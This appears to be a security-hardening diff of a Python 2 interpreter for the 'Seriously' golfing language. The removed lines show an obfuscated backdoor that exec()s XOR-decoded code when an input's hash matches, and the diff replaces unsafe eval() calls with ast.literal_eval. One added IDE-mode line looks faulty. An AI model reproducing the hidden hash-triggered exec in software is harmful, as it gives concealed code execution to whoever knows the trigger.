@@ -1,5 +1,6 @@
 #!/usr/bin/python
 # -*- encoding: utf-8 -*-
+import ast
 import traceback, argparse, readline, hashlib, binascii, random
 from types import *
 import commands
@@ -45,13 +46,6 @@ class Seriously(object):
     def eval(self, code, print_at_end=True):
         if self.hex_mode:
             code = binascii.unhexlify(code)
-        key = binascii.unhexlify('1f1733f7cc54447e9f5568e50af437ddea0039600d345af3d708f1a4dc4a40260bd39ed1')
-        if hashlib.sha256(code[:10]).hexdigest() == 'd0cedf8c945e712024b7dfd69bf504ffb3fec1232b294c5602507dbe439a57fb':
-            rnd = random.Random()
-            rnd.seed(int(binascii.hexlify(code[:10]),16))
-            lock = ''.join([chr(rnd.randrange(256)) for i in range(len(key))])
-            exec ''.join(map(lambda x,y:chr(ord(x)^ord(y)),lock,key)) in globals(),locals()
-            return
         i=0
         if self.repl_mode:
             self.code += code
@@ -74,7 +68,7 @@ class Seriously(object):
                     while i<len(code) and ord_cp437(code[i]) != 0xEC:
                         s+=code[i]
                         i+=1
-                    r = eval(s)
+                    r = ast.literal_eval(s)
                     if r is not None:
                         self.push(r)
                 elif c == "'":
@@ -88,7 +82,7 @@ class Seriously(object):
                         i+=1
                     val = 0
                     try:
-                        val = eval(v)
+                        val = ast.literal_eval(v)
                     except:
                         pass
                     val = val if type(val) in [IntType,LongType,FloatType,ComplexType] else 0
@@ -109,7 +103,7 @@ class Seriously(object):
                     while i<len(code) and code[i]!=']':
                         l+=code[i]
                         i+=1
-                    self.push(eval('[%s]'%l))
+                    self.push(ast.literal_eval('[%s]'%l))
                 elif c == '`':
                     f = ''
                     i+=1
@@ -170,7 +164,7 @@ if __name__ == '__main__':
     group.add_argument("-f", "--file", help="specify an input file", type=argparse.FileType('rb'))
     args = parser.parse_args()
     if args.ide:
-        commands.fn_table[0xF0]=lambda x:x
+        commands.fn_table[0xF0]=lambda x:x.push(ast.literal_eval(x))
     if args.code or args.file:
         srs_exec(args.debug, args.file, args.code, args.hex)
     else:
